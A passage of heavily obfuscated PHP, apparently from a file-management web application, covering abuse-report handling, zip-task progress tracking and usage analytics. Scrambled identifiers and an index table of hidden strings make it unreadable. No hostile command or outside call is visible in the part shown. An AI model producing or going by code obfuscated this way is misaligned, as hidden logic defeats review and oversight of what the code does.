(!$ö˜ˆûĞ±[$’ÖŸ“¯ù[2219]] || $ö˜ˆûĞ±[$’ÖŸ“¯ù[2219]][$’ÖŸ“¯ù[863]] != $’ÖŸ“¯ù[101]) { unset($‰™ó‚ƒ¿[$ªæŸ§ù—]); continue; } $ÚÁÁô = $ö˜ˆûĞ±[$’ÖŸ“¯ù[204]]; $ö˜ˆûĞ±[$’ÖŸ“¯ù[100]] = $ÚÕŒãĞ[$ÚÁÁô] ? $ÚÕŒãĞ[$ÚÁÁô] : !1; if ($ö˜ˆûĞ±[$’ÖŸ“¯ù[100]][$’ÖŸ“¯ù[525]] == $’ÖŸ“¯ù[101]) { unset($‰™ó‚ƒ¿[$ªæŸ§ù—]); } if ($ö˜ˆûĞ±[$’ÖŸ“¯ù[100]] != $’ÖŸ“¯ù[241] && !$ö˜ˆûĞ±[$’ÖŸ“¯ù[100]]) { unset($‰™ó‚ƒ¿[$ªæŸ§ù—]); } } unset($ö˜ˆûĞ±); $‰™ó‚ƒ¿ = array_values($‰™ó‚ƒ¿); } private function _makeOrder($ÜØÓæçÚ = '') { $õİ€¥ =& $_SERVER[¬ÏÕ§Áú]; $—™´ó¶ = array($õİ€¥[244], $õİ€¥[875], $õİ€¥[2203], $õİ€¥[2204]); $á÷Š“à’ = array($õİ€¥[542] => $õİ€¥[543], $õİ€¥[544] => $õİ€¥[545]); $Ø·¿´ˆ = Input::get($õİ€¥[549], $õİ€¥[7], $õİ€¥[517], $—™´ó¶); $°Ÿ«Ÿù = Input::get($õİ€¥[550], $õİ€¥[7], $õİ€¥[2220], array($õİ€¥[2132], $õİ€¥[544])); $°Ÿ«Ÿù = $á÷Š“à’[$°Ÿ«Ÿù]; $ÜØÓæçÚ = $ÜØÓæçÚ . "{$Ø·¿´ˆ}\x20{$°Ÿ«Ÿù}"; return $this->order($ÜØÓæçÚ); } public function reportAdd($ßòùŞì) { $«£ÍÑ =& $_SERVER[¬ÏÕ§Áú]; $’°ÑÀ = array($«£ÍÑ[689] => $ßòùŞì[$«£ÍÑ[689]], $«£ÍÑ[1837] => USER_ID); if (Model($«£ÍÑ[2216])->where($’°ÑÀ)->find()) { return !1; } $Ö£¥ÑÂå = array($«£ÍÑ[689] => $ßòùŞì[$«£ÍÑ[689]], $«£ÍÑ[1722] => $ßòùŞì[$«£ÍÑ[1722]], $«£ÍÑ[204] => $ßòùŞì[$«£ÍÑ[204]], $«£ÍÑ[562] => $ßòùŞì[$«£ÍÑ[562]], $«£ÍÑ[1837] => USER_ID, $«£ÍÑ[33] => $ßòùŞì[$«£ÍÑ[33]], $«£ÍÑ[545] => $ßòùŞì[$«£ÍÑ[545]]); return Model($«£ÍÑ[2216])->add($Ö£¥ÑÂå); } public function reportList($ƒù¨°‘ã) { $ÌáŠĞö =& $_SERVER[¬ÏÕ§Áú]; $›˜®µßß = array(); if ($ƒù¨°‘ã[$ÌáŠĞö[874]]) { $¿ì—µ›« = $ƒù¨°‘ã[$ÌáŠĞö[875]] ? $ƒù¨°‘ã[$ÌáŠĞö[875]] : strtotime(date($ÌáŠĞö[2218])); $›˜®µßß[$ÌáŠĞö[244]] = array($ÌáŠĞö[419], array($ƒù¨°‘ã[$ÌáŠĞö[874]], $¿ì—µ›«)); } if (isset($ƒù¨°‘ã[$ÌáŠĞö[33]]) && in_array($ƒù¨°‘ã[$ÌáŠĞö[33]], array($ÌáŠĞö[101], $ÌáŠĞö[529], $ÌáŠĞö[2221], $ÌáŠĞö[2222], $ÌáŠĞö[2223]))) { $›˜®µßß[$ÌáŠĞö[33]] = $ƒù¨°‘ã[$ÌáŠĞö[33]]; } if (isset($ƒù¨°‘ã[$ÌáŠĞö[863]]) && in_array($ƒù¨°‘ã[$ÌáŠĞö[863]], array($ÌáŠĞö[241], $ÌáŠĞö[101], $ÌáŠĞö[529], $ÌáŠĞö[2221]))) { $›˜®µßß[$ÌáŠĞö[863]] = $ƒù¨°‘ã[$ÌáŠĞö[863]]; } $÷¿³ÁË = Input::get($ÌáŠĞö[550], $ÌáŠĞö[7], $ÌáŠĞö[2220], array($ÌáŠĞö[2132], $ÌáŠĞö[544])); $×Ç“°¸ = array($ÌáŠĞö[542] => $ÌáŠĞö[543], $ÌáŠĞö[544] => $ÌáŠĞö[545]); $ß³—Ÿì = $ÌáŠĞö[2224] . $×Ç“°¸[$÷¿³ÁË]; $‡€ñº¸ú = Model($ÌáŠĞö[2216])->where($›˜®µßß)->order($ß³—Ÿì)->selectPage(20); if (empty($‡€ñº¸ú[$ÌáŠĞö[456]])) { return array(); } $‹ü¥è‡« = array_to_keyvalue_group($‡€ñº¸ú[$ÌáŠĞö[456]], $ÌáŠĞö[863], $ÌáŠĞö[689]); if (!empty($‹ü¥è‡«[0])) { $ƒù¨°‘ã = $‹ü¥è‡«[0]; $›˜®µßß = array($ÌáŠĞö[689] => array($ÌáŠĞö[7], $ƒù¨°‘ã)); $ó¾Â•ª = $this->where($›˜®µßß)->field($ÌáŠĞö[689])->select(); $ó¾Â•ª = array_to_keyvalue($ó¾Â•ª, $ÌáŠĞö[12], $ÌáŠĞö[689]); $¥Ó´ÌÉî = array_diff($ƒù¨°‘ã, $ó¾Â•ª); if (!empty($¥Ó´ÌÉî)) { foreach ($‡€ñº¸ú[$ÌáŠĞö[456]] as $¾‹é´€À => $¢õó¤Åß) { if (in_array($¢õó¤Åß[$ÌáŠĞö[689]], $¥Ó´ÌÉî)) { unset($‡€ñº¸ú[$ÌáŠĞö[456]][$¾‹é´€À]); } } } } $this->_listDataApply($‡€ñº¸ú[$ÌáŠĞö[456]]); return $‡€ñº¸ú; } public function reportStatus($ŞËî÷°) { $°†¶«‚ =& $_SERVER[¬ÏÕ§Áú]; $‹À£ÊÍ = array($°†¶«‚[492] => $ŞËî÷°[$°†¶«‚[492]]); $†¥ªñÙñ = Model($°†¶«‚[2216])->where($‹À£ÊÍ)->field($°†¶«‚[2225])->find(); if (!$†¥ªñÙñ) { return !1; } $¡òûËØ = array($°†¶«‚[863] => $ŞËî÷°[$°†¶«‚[863]]); if ($ŞËî÷°[$°†¶«‚[863]] == $°†¶«‚[2221] && $†¥ªñÙñ[$°†¶«‚[863]] == $°†¶«‚[2221]) { $¡òûËØ[$°†¶«‚[863]] = 0; } $© ÁİéÙ = Model($°†¶«‚[2216])->where($‹À£ÊÍ)->save($¡òûËØ); if ($ŞËî÷°[$°†¶«‚[863]] == $°†¶«‚[529]) { if ($†¥ªñÙñ[$°†¶«‚[562]] != $°†¶«‚[241] && $this->shareFileMeta($†¥ªñÙñ[$°†¶«‚[562]])) { $this->shareFileMeta($†¥ªñÙñ[$°†¶«‚[562]], 0); } $this->remove($†¥ªñÙñ[$°†¶«‚[689]]); return !0; } if ($© ÁİéÙ && $ŞËî÷°[$°†¶«‚[863]] == $°†¶«‚[2221]) { $˜Œˆéçù = $¡òûËØ[$°†¶«‚[863]] == $°†¶«‚[2221] ? 1 : 0; $this->shareFileMeta($†¥ªñÙñ[$°†¶«‚[562]], $˜Œˆéçù); $this->removeByFile($†¥ªñÙñ[$°†¶«‚[562]]); } return $© ÁİéÙ; } private function removeByFile($ˆÂÜúˆµ) { $êÙ¥âšÖ =& $_SERVER[¬ÏÕ§Áú]; $»Ş‰ñ‹Ã = Model($êÙ¥âšÖ[946])->where(array($êÙ¥âšÖ[562] => $ˆÂÜúˆµ))->field($êÙ¥âšÖ[204])->select(); $®Şçú½Î = array_to_keyvalue($»Ş‰ñ‹Ã, $êÙ¥âšÖ[12], $êÙ¥âšÖ[204]); $¯ØİÊôà = array($êÙ¥âšÖ[204] => array($êÙ¥âšÖ[7], $®Şçú½Î), $êÙ¥âšÖ[583] => 1); $»Ş‰ñ‹Ã = $this->where($¯ØİÊôà)->field($êÙ¥âšÖ[689])->select(); if (empty($»Ş‰ñ‹Ã)) { return; } $¯–Ï£·× = array_to_keyvalue($»Ş‰ñ‹Ã, $êÙ¥âšÖ[12], $êÙ¥âšÖ[689]); $this->remove($¯–Ï£·×); } private function shareFileMeta($¼ó·ùÅì, $ñú¼ ß× = null) { $“öÒéÀ =& $_SERVER[¬ÏÕ§Áú]; $²¨îÏÛ = array($“öÒéÀ[562] => $¼ó·ùÅì, $“öÒéÀ[107] => $“öÒéÀ[2226]); if (is_null($ñú¼ ß×)) { return Model($“öÒéÀ[2227])->where($²¨îÏÛ)->find(); } $²¨îÏÛ[$“öÒéÀ[461]] = $ñú¼ ß×; Model($“öÒéÀ[2227])->add($²¨îÏÛ, array(), !0); } } goto F¦òöË²ÌÆ; d¶ÚÙÁÔ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $«®İ ˆ =& $_SERVER[¬ÏÕ§Áú]; parent::startAfter(); Hook::bind($«®İ ˆ[1964], array($this, $«®İ ˆ[1954])); Hook::bind($«®İ ˆ[1956], array($this, $«®İ ˆ[1957])); $Ù»¿²Ø¢ =& $this->task; $Ù»¿²Ø¢[$«®İ ˆ[1958]] = $«®İ ˆ[1334]; if (!$Ù»¿²Ø¢[$«®İ ˆ[1722]]) { $Ù»¿²Ø¢[$«®İ ˆ[1722]] = LNG($«®İ ˆ[1965]); } } protected function endAfter() { $§é¸š– =& $_SERVER[¬ÏÕ§Áú]; parent::endAfter(); Hook::unbind($§é¸š–[1964], array($this, $§é¸š–[1954])); Hook::unbind($§é¸š–[1956], array($this, $§é¸š–[1957])); } public function updateAfter() { $¶Ú•ÆÅ =& $_SERVER[¬ÏÕ§Áú]; $¡îÅ·Äú =& $this->task; if (!$¡îÅ·Äú[$¶Ú•ÆÅ[1188]] || !$¡îÅ·Äú[$¶Ú•ÆÅ[877]]) { return; } if ($¡îÅ·Äú[$¶Ú•ÆÅ[1958]] == $¶Ú•ÆÅ[1334]) { $Ø­Õ«éº = $¡îÅ·Äú[$¶Ú•ÆÅ[1892]]; if ($¡îÅ·Äú[$¶Ú•ÆÅ[1893]] != $¶Ú•ÆÅ[1334]) { $Ø­Õ«éº = 0; } $»ãŞ‹ = ($¡îÅ·Äú[$¶Ú•ÆÅ[1896]] + $Ø­Õ«éº) / $¡îÅ·Äú[$¶Ú•ÆÅ[877]]; $¡îÅ·Äú[$¶Ú•ÆÅ[1839]] = $»ãŞ‹ * 0.3; } else { if ($¡îÅ·Äú[$¶Ú•ÆÅ[1958]] == $¶Ú•ÆÅ[399]) { $»ãŞ‹ = $¡îÅ·Äú[$¶Ú•ÆÅ[1838]] / $¡îÅ·Äú[$¶Ú•ÆÅ[1188]]; $¡îÅ·Äú[$¶Ú•ÆÅ[1839]] = 0.3 + $»ãŞ‹ * 0.5; } else { if ($¡îÅ·Äú[$¶Ú•ÆÅ[1958]] == $¶Ú•ÆÅ[120]) { $»ãŞ‹ = 0; if ($¡îÅ·Äú[$¶Ú•ÆÅ[1891]]) { $»ãŞ‹ = $¡îÅ·Äú[$¶Ú•ÆÅ[1892]] / $¡îÅ·Äú[$¶Ú•ÆÅ[1891]]; } $¡îÅ·Äú[$¶Ú•ÆÅ[1839]] = 0.3 + 0.5 + $»ãŞ‹ * 0.2; } } } if ($¡îÅ·Äú[$¶Ú•ÆÅ[1839]] > 0) { $ŠĞƒ = timeFloat() - $¡îÅ·Äú[$¶Ú•ÆÅ[1841]] - $¡îÅ·Äú[$¶Ú•ÆÅ[1844]]; $¡îÅ·Äú[$¶Ú•ÆÅ[1845]] = $ŠĞƒ * (1 - $¡îÅ·Äú[$¶Ú•ÆÅ[1839]]) / $¡îÅ·Äú[$¶Ú•ÆÅ[1839]]; } } public function copyFileStart($š…¶Ä‘‘, $°‚¼ô, $¥›ğ¡Ø, $õ×Ÿ„ŠÉ, $„èÌûÙé, $Ñé€îÕ) { $ìãèæÆ‡ =& $_SERVER[¬ÏÕ§Áú]; parent::copyFileStart($š…¶Ä‘‘, $°‚¼ô, $¥›ğ¡Ø, $õ×Ÿ„ŠÉ, $„èÌûÙé, $Ñé€îÕ); $·Ò§Ù÷‹ =& $this->task; if ($·Ò§Ù÷‹[$ìãèæÆ‡[1958]] == $ìãèæÆ‡[399]) { $·Ò§Ù÷‹[$ìãèæÆ‡[1958]] = $ìãèæÆ‡[120]; } $this->update(); } public function copyFileEnd($â¯œ¦—¯, $¢ÚÂ¿ÌØ, $·””´½—, $ä½‰ƒş“, $œ·¤…Ü, $§äÕÌÁ) { $ÌÈ­‘÷ =& $_SERVER[¬ÏÕ§Áú]; $üš¸¢¡¬ =& $this->task; $üš¸¢¡¬[$ÌÈ­‘÷[1892]] = $üš¸¢¡¬[$ÌÈ­‘÷[1891]]; $üš¸¢¡¬[$ÌÈ­‘÷[1896]] += $üš¸¢¡¬[$ÌÈ­‘÷[1891]]; $üš¸¢¡¬[$ÌÈ­‘÷[1893]] = $ÌÈ­‘÷[12]; $this->update(); } public function zipEvent($¥ÜÓÍ®, $»şÊÉúä, $æÃì§ƒ¬, $õâÃí€Â) { $ªØ£›•ê =& $_SERVER[¬ÏÕ§Áú]; $¦çÑÂ°ó =& $this->task; $¦çÑÂ°ó[$ªØ£›•ê[1889]] = get_path_this($»şÊÉúä); $¦çÑÂ°ó[$ªØ£›•ê[1891]] = $õâÃí€Â; $¦çÑÂ°ó[$ªØ£›•ê[1892]] = $æÃì§ƒ¬; $¦çÑÂ°ó[$ªØ£›•ê[1190]] = $¥ÜÓÍ® == $ªØ£›•ê[1966] ? $ªØ£›•ê[1961] : $ªØ£›•ê[1962]; $¦çÑÂ°ó[$ªØ£›•ê[1893]] = $ªØ£›•ê[12]; $¦çÑÂ°ó[$ªØ£›•ê[877]] = $õâÃí€Â; $¦çÑÂ°ó[$ªØ£›•ê[1958]] = $ªØ£›•ê[399]; $this->update(); } public function nameParse($±¶å«šÃ) { $ÊãŠï¤ò =& $_SERVER[¬ÏÕ§Áú]; $Áãé¤Ìİ =& $this->task; if ($Áãé¤Ìİ[$ÊãŠï¤ò[1838]] < $Áãé¤Ìİ[$ÊãŠï¤ò[1188]]) { $‹‹ÜœÍ¶ = get_path_this($±¶å«šÃ); if (strstr($‹‹ÜœÍ¶, $ÊãŠï¤ò[10])) { $Áãé¤Ìİ[$ÊãŠï¤ò[1838]] += 1; } } if ($Áãé¤Ìİ[$ÊãŠï¤ò[1958]] == $ÊãŠï¤ò[1334]) { $Áãé¤Ìİ[$ÊãŠï¤ò[1958]] = $ÊãŠï¤ò[399]; } $Áãé¤Ìİ[$ÊãŠï¤ò[1889]] = $±¶å«šÃ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($‹îê’ª•) { $·× ´›£ =& $_SERVER[¬ÏÕ§Áú]; $“ñ÷ôä¥ = array($·× ´›£[686] => array($·× ´›£[33] => $·× ´›£[1967], $·× ´›£[362] => array($·× ´›£[295], $·× ´›£[879], $·× ´›£[1968], $·× ´›£[1969])), $·× ´›£[1970] => array($·× ´›£[33] => $·× ´›£[1971], $·× ´›£[362] => array($·× ´›£[295], $·× ´›£[877], $·× ´›£[1972], $·× ´›£[1973], $·× ´›£[1974]))); if (!isset($“ñ÷ôä¥[$‹îê’ª•])) { return !1; } $this->optionType = $“ñ÷ôä¥[$‹îê’ª•][$·× ´›£[33]]; $this->field = $“ñ÷ôä¥[$‹îê’ª•][$·× ´›£[362]]; return !0; } public function listData($üÏ¶Ä¾ = false, $Ã•šÉæ¾ = "\155\157\144\151\x66\x79\124\151\155\145", $üŠ…‰ï = false) { return parent::listData($üÏ¶Ä¾, $Ã•šÉæ¾, $üŠ…‰ï); } public function trendList($íóÌ˜æ) { $è‚ÌûûÏ =& $_SERVER[¬ÏÕ§Áú]; $Ì‹éãí² = $this->listData(); if ($Ì‹éãí²) { $¶Åˆ±ñÔ = end($Ì‹éãí²); $ª¥«À‰Î = date($è‚ÌûûÏ[1975], strtotime($è‚ÌûûÏ[1976])); if ($¶Åˆ±ñÔ[$è‚ÌûûÏ[295]] == $ª¥«À‰Î) { return $Ì‹éãí²; } $™‘Ë„¿ş = strtotime($¶Åˆ±ñÔ[$è‚ÌûûÏ[295]]); } if (!isset($™‘Ë„¿ş)) { $ˆ½ËÇœû = $íóÌ˜æ == $è‚ÌûûÏ[686] ? $è‚ÌûûÏ[618] : $è‚ÌûûÏ[946]; $™‘Ë„¿ş = Model($ˆ½ËÇœû)->min($è‚ÌûûÏ[244]); } $ŸœÔÒİ = $è‚ÌûûÏ[1977] . ucfirst($íóÌ˜æ); $·Ï§Öï = $this->dateList($™‘Ë„¿ş); foreach ($·Ï§Öï as $ª¥«À‰Î) { $this->{$ŸœÔÒİ}($ª¥«À‰Î); } return $this->listData(); } private function dateList($½·Å’«ª) { $ØØùƒ¢Ã =& $_SERVER[¬ÏÕ§Áú]; $£ˆº’µ¯ = $½·Å’«ª; $²»Û´å† = strtotime($ØØùƒ¢Ã[1976]); $Øç›‚ÑÈ = array(); while ($£ˆº’µ¯ <= $²»Û´å†) { $Øç›‚ÑÈ[] = date($ØØùƒ¢Ã[1975], $£ˆº’µ¯); $£ˆº’µ¯ = strtotime($ØØùƒ¢Ã[1978], $£ˆº’µ¯); } return $Øç›‚ÑÈ; } public function _recordUser($Ãíƒæ„ = '') { $ß”ˆßÜ– =& $_SERVER[¬ÏÕ§Áú]; $é‘„ß²º = strtotime(date($ß”ˆßÜ–[1979], strtotime($Ãíƒæ„))); $àëÙş‡‹ = strtotime(date($ß”ˆßÜ–[1980], strtotime($Ãíƒæ„))); $ëöûš‹ = array($ß”ˆßÜ–[244] => array($ß”ˆßÜ–[1138], $àëÙş‡‹)); $À˜¤ˆ¡Ã = Model($ß”ˆßÜ–[618])->where($ëöûš‹)->count($ß”ˆßÜ–[1837]); $ëöûš‹[$ß”ˆßÜ–[244]] = array($ß”ˆßÜ–[419], array($é‘„ß²º, $àëÙş‡‹)); $»©›Ş…› = Model($ß”ˆßÜ–[618])->where($ëöûš‹)->count($ß”ˆßÜ–[1837]); $ëöûš‹[$ß”ˆßÜ–[33]] = $ß”ˆßÜ–[1981]; $ç‘¦ê§Ë = Model($ß”ˆßÜ–[1982])->where($ëöûš‹)->count($ß”ˆßÜ–[1983]); $ˆÇØ¥Ï– = array($ß”ˆßÜ–[295] => $Ãíƒæ„, $ß”ˆßÜ–[879] => (int) $À˜¤ˆ¡Ã, $ß”ˆßÜ–[1968] => (int) $»©›Ş…›, $ß”ˆßÜ–[1969] => (int) $ç‘¦ê§Ë); return $this->insert($ˆÇØ¥Ï–); } public function _recordStore($Ï¥äÅ²‚ = '') { $¦·ª‚òË =& $_SERVER[¬ÏÕ§Áú]; $¹‚¯İÍ = strtotime(date($¦·ª‚òË[1980], strtotime($Ï¥äÅ²‚))); $ı‹È­† = array($¦·ª‚òË[244] => array($¦·ª‚òË[1138], $¹‚¯İÍ)); $÷¶ÚüÚ¯ = Model($¦·ª‚òË[565])->where($ı‹È­†)->sum($¦·ª‚òË[89]); $ı‹È­†[$¦·ª‚òË[505]] = 0; $úÜİ¤ºé = Model($¦·ª‚òË[946])->where($ı‹È­†)->sum($¦·ª‚òË[89]); $ı‹È­†[$¦·ª‚òË[201]] = 1; $ÒÔ·Ö‚ı = Model($¦·ª‚òË[946])->where($ı‹È­†)->sum($¦·ª‚òË[89]); $ı‹È­†[$¦·ª‚òË[201]] = 2; $²ëı”µ£ = Model($¦·ª‚òË[946])->where($ı‹È­†)->sum($¦·ª‚òË[89]); $ ùåÂ¤ = array($¦·ª‚òË[295] => $Ï¥äÅ²‚, $¦·ª‚òË[877] => (int) $úÜİ¤ºé, $¦·ª‚òË[1972] => (int) $÷¶ÚüÚ¯, $¦·ª‚òË[1973] => (int) $ÒÔ·Ö‚ı, $¦·ª‚òË[1974] => (int) $²ëı”µ£); return $this->insert($ ùåÂ¤); } public function trend($ÆİçñÛÚ, $†›åÃ¯º) { $ú¨ÇìÒŠ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->init($ÆİçñÛÚ)) { return !1; } $¤è¶úù‘ = $this->trendList($ÆİçñÛÚ); if ($¤è¶úù‘ && $†›åÃ¯º != $ú¨ÇìÒŠ[1809]) { $”Æ³õº° = $¤è¶úù‘[0][$ú¨ÇìÒŠ[295]]; $ë÷ôÍîõ = $this->validDate($†›åÃ¯º, $”Æ³õº°); $ïÅéõ = array(); $ÔñÏì¤ğ = array_to_keyvalue($¤è¶úù‘, $ú¨ÇìÒŠ[295]); foreach ($ë÷ôÍîõ as $¨É‡ï°Ó) { if (isset($ÔñÏì¤ğ[$¨É‡ï°Ó])) { $Ÿ•½±Ÿ¨ = $ÔñÏì¤ğ[$¨É‡ï°Ó]; } else { $Ÿ•½±Ÿ¨ = end($¤è¶úù‘); $Ÿ•½±Ÿ¨[$ú¨ÇìÒŠ[295]] = $¨É‡ï°Ó; if ($ÆİçñÛÚ == $ú¨ÇìÒŠ[686]) { $Ÿ•½±Ÿ¨[$ú¨ÇìÒŠ[1968]] = $Ÿ•½±Ÿ¨[$ú¨ÇìÒŠ[1969]] = 0; } } $ïÅéõ[] = $Ÿ•½±Ÿ¨; } $¤è¶úù‘ = $ïÅéõ; } $‹¤šá» = array($ú¨ÇìÒŠ[686] => array($ú¨ÇìÒŠ[879] => LNG($ú¨ÇìÒŠ[1984]), $ú¨ÇìÒŠ[1968] => LNG($ú¨ÇìÒŠ[1985]), $ú¨ÇìÒŠ[1969] => LNG($ú¨ÇìÒŠ[1986])), $ú¨ÇìÒŠ[1970] => array($ú¨ÇìÒŠ[877] => LNG($ú¨ÇìÒŠ[1987]), $ú¨ÇìÒŠ[1972] => LNG($ú¨ÇìÒŠ[1988]), $ú¨ÇìÒŠ[1973] => LNG($ú¨ÇìÒŠ[1989]), $ú¨ÇìÒŠ[1974] => LNG($ú¨ÇìÒŠ[1990]))); $ÕÂÉÛÓÌ = array($ú¨ÇìÒŠ[686] => $ú¨ÇìÒŠ[1991], $ú¨ÇìÒŠ[1970] => $ú¨ÇìÒŠ[89]); if (empty($¤è¶úù‘)) { $¨É‡ï°Ó = date($ú¨ÇìÒŠ[1975], strtotime($ú¨ÇìÒŠ[1976])); $ã»Öû›« = array($ú¨ÇìÒŠ[295] => $¨É‡ï°Ó); foreach ($‹¤šá»[$ÆİçñÛÚ] as $Í³åéæ => $¿‹úı…Š) { $ã»Öû›«[$Í³åéæ] = 0; } $¤è¶úù‘[] = $ã»Öû›«; } $á¤ûÉ’ = array(); foreach ($¤è¶úù‘ as $¿‹úı…Š) { if ($ÆİçñÛÚ == $ú¨ÇìÒŠ[1970] && $¿‹úı…Š[$ú¨ÇìÒŠ[1972]] > $¿‹úı…Š[$ú¨ÇìÒŠ[877]]) { $¿‹úı…Š[$ú¨ÇìÒŠ[1972]] = $¿‹úı…Š[$ú¨ÇìÒŠ[877]]; } foreach ($‹¤šá»[$ÆİçñÛÚ] as $Í³åéæ => $³½†ØêÏ) { $Ÿ•½±Ÿ¨ = array($ú¨ÇìÒŠ[295] => $¿‹úı…Š[$ú¨ÇìÒŠ[295]], $ú¨ÇìÒŠ[1722] => $³½†ØêÏ); $Ÿ•½±Ÿ¨[$ÕÂÉÛÓÌ[$ÆİçñÛÚ]] = isset($¿‹úı…Š[$Í³åéæ]) ? $¿‹úı…Š[$Í³åéæ] : 0; $á¤ûÉ’[] = $Ÿ•½±Ÿ¨; } } return $á¤ûÉ’; } public function validDate($ˆ±ù­¨°, $…ø•ƒÊ) { $ïÔ¸”¶Œ =& $_SERVER[¬ÏÕ§Áú]; $¨ÄÊø„ª = date($ïÔ¸”¶Œ[1975], strtotime($ïÔ¸”¶Œ[1976])); $ıü·˜­ç = array($¨ÄÊø„ª); switch ($ˆ±ù­¨°) { case $ïÔ¸”¶Œ[1816]: $¹’ĞÇÉü = mktime(0, 0, 0, date($ïÔ¸”¶Œ[1992]), date($ïÔ¸”¶Œ[1514]) - date($ïÔ¸”¶Œ[1603]) + 7 - 7, date($ïÔ¸”¶Œ[1993])); $ĞÀï¯¿‘ = 0; do { $ôŞÏƒ = date($ïÔ¸”¶Œ[1975], $¹’ĞÇÉü - 3600 * 24 * 7 * $ĞÀï¯¿‘); $ıü·˜­ç[] = $ôŞÏƒ; $ĞÀï¯¿‘++; } while ($…ø•ƒÊ < $ôŞÏƒ); break; case $ïÔ¸”¶Œ[1814]: $ĞÀï¯¿‘ = 1; do { $ÜÚ¥â© = date($ïÔ¸”¶Œ[1994], strtotime("\55\40{$ĞÀï¯¿‘}\40\155\x6f\156\x74\x68\163")); $ıü·˜­ç[] = $ÜÚ¥â©; $ĞÀï¯¿‘++; } while ($…ø•ƒÊ < $ÜÚ¥â©); break; case $ïÔ¸”¶Œ[1995]: $ÈíŠ¨Âà = (int) date($ïÔ¸”¶Œ[1993], strtotime($…ø•ƒÊ)); $’°‚¤íá = (int) date($ïÔ¸”¶Œ[1993]); if ($ÈíŠ¨Âà >= $’°‚¤íá) { break; } for ($ÈíŠ¨Âà; $ÈíŠ¨Âà < $’°‚¤íá; $ÈíŠ¨Âà++) { $ıü·˜­ç[] = $ÈíŠ¨Âà . $ïÔ¸”¶Œ[1996]; } break; default: break; } if ($…ø•ƒÊ > end($ıü·˜­ç)) { array_pop($ıü·˜­ç); } sort($ıü·˜­ç); return $ıü·˜­ç; } public function listTable($ÓéÒÍ‡«) { $§ğÎ¹û = ucfirst($ÓéÒÍ‡«); return Model($§ğÎ¹û)->listData(); } public function option($·ã™Ôº) { $®‹‡ó£š = $_SERVER[¬ÏÕ§Áú][1997] . ucfirst($·ã™Ôº); return $this->{$®‹‡ó£š}(); } private function optionUser() { $ï¤Ïº¬ñ =& $_SERVER[¬ÏÕ§Áú]; $äÒŠ¬¢ = Model($ï¤Ïº¬ñ[618])->count($ï¤Ïº¬ñ[1837]); $úÌ·ªùÇ = Model($ï¤Ïº¬ñ[618])->where($ï¤Ïº¬ñ[1998])->count($ï¤Ïº¬ñ[1837]); $Ÿ—¥ıÔé = intval($GLOBALS[$ï¤Ïº¬ñ[6]][$ï¤Ïº¬ñ[435]][$ï¤Ïº¬ñ[1782]]) / 3600; $‘ô˜¯¢ = strtotime("\55{$Ÿ—¥ıÔé}\x20\150\157\165\162\163"); $¤­şñğÓ = strtotime(date($ï¤Ïº¬ñ[1979])); if ($‘ô˜¯¢ < $¤­şñğÓ) { $‘ô˜¯¢ = $¤­şñğÓ; } $‘ó·¼é¯ = array($ï¤Ïº¬ñ[1999] => array($ï¤Ïº¬ñ[1139], $‘ô˜¯¢)); $ß¨ë­’ä = (int) Model($ï¤Ïº¬ñ[618])->where($‘ó·¼é¯)->count($ï¤Ïº¬ñ[1837]); if (!$ß¨ë­’ä) { $ß¨ë­’ä = 1; } $‘ó·¼é¯ = array($ï¤Ïº¬ñ[1999] => array($ï¤Ïº¬ñ[1139], $¤­şñğÓ)); $«â„ = Model($ï¤Ïº¬ñ[618])->where($‘ó·¼é¯)->count($ï¤Ïº¬ñ[1837]); return array($ï¤Ïº¬ñ[872] => (int) $äÒŠ¬¢, $ï¤Ïº¬ñ[2000] => (int) ($äÒŠ¬¢ - $úÌ·ªùÇ), $ï¤Ïº¬ñ[2001] => (int) $úÌ·ªùÇ, $ï¤Ïº¬ñ[2002] => (int) $«â„, $ï¤Ïº¬ñ[2003] => $ß¨ë­’ä); } private function optionFile() { $œ’¦¤ïö =& $_SERVER[¬ÏÕ§Áú]; $õ¸Óæø = $this->sourceSize(); $ÒÕ’á¡Û = $õ¸Óæø[$œ’¦¤ïö[89]]; $ÇÂî¯Â = $õ¸Óæø[$œ’¦¤ïö[1972]]; $£¹¯ï³¸ = Model($œ’¦¤ïö[946])->where(array($œ’¦¤ïö[505] => 0))->count($œ’¦¤ïö[204]); $É„¤ÌÚ³ = array($œ’¦¤ïö[505] => 0, $œ’¦¤ïö[244] => array($œ’¦¤ïö[1139], strtotime(date($œ’¦¤ïö[1979])))); $Ã‡ÔšÒ = Model($œ’¦¤ïö[946])->where($É„¤ÌÚ³)->sum($œ’¦¤ïö[89]); $†«Ğ™€ş = Model($œ’¦¤ïö[946])->where($É„¤ÌÚ³)->count($œ’¦¤ïö[204]); return array($œ’¦¤ïö[877] => $ÒÕ’á¡Û, $œ’¦¤ïö[1972] => $ÇÂî¯Â, $œ’¦¤ïö[2004] => $ÒÕ’á¡Û - $ÇÂî¯Â, $œ’¦¤ïö[2005] => (int) $Ã‡ÔšÒ, $œ’¦¤ïö[879] => (int) $£¹¯ï³¸, $œ’¦¤ïö[2006] => (int) $†«Ğ™€ş); } private function optionAccess() { $Âäô‘Óù =& $_SERVER[¬ÏÕ§Áú]; return array($Âäô‘Óù[872] => $this->typeLogCnt(), $Âäô‘Óù[120] => $this->typeLogCnt($Âäô‘Óù[120]), $Âäô‘Óù[544] => $this->typeLogCnt($Âäô‘Óù[544]), $Âäô‘Óù[1282] => $this->typeLogCnt($Âäô‘Óù[1282]), $Âäô‘Óù[2007] => $this->typeLogCnt($Âäô‘Óù[2007]), $Âäô‘Óù[686] => $this->typeLogCnt($Âäô‘Óù[12], $Âäô‘Óù[1983])); } private function typeLogCnt($äƒûÈí‚ = '', $ã§ñÍ³ş = "\151\144") { $úÕ¯‡öù =& $_SERVER[¬ÏÕ§Áú]; $ş‡àÅöî = array($úÕ¯‡öù[120] => array($úÕ¯‡öù[2008], $úÕ¯‡öù[2009]), $úÕ¯‡öù[544] => array($úÕ¯‡öù[2010], $úÕ¯‡öù[2011]), $úÕ¯‡öù[1282] => array($úÕ¯‡öù[2012], $úÕ¯‡öù[2013], $úÕ¯‡öù[2014]), $úÕ¯‡öù[2007] => array($úÕ¯‡öù[2015], $úÕ¯‡öù[2016]), $úÕ¯‡öù[2017] => array($úÕ¯‡öù[2018], $úÕ¯‡öù[2019], $úÕ¯‡öù[2020])); $ñù¹·™ = strtotime(date($úÕ¯‡öù[1979])); $›æ„Óê = array($úÕ¯‡öù[244] => array($úÕ¯‡öù[1139], $ñù¹·™)); 